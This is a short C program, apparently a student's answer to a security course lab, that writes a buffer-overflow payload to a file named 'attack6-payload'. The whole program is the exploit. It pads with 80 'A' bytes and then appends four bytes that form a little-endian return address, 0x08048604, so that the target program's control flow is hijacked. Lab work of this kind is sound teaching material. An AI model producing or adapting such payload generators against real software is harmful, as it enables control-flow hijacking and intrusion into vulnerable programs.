#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
	       int buffer_length=84;
   char buffer[buffer_length];

   int i=0;
        for (i=0;i< buffer_length-4;i++){
                buffer[i]='A';
        }

   buffer[80]='\x04';
   buffer[81]='\x86';
   buffer[82]='\x04';
   buffer[83]='\x08';



    write_to_file( "attack6-payload", buffer , buffer_length , FILE_CLEAR );
    exit(0);
}
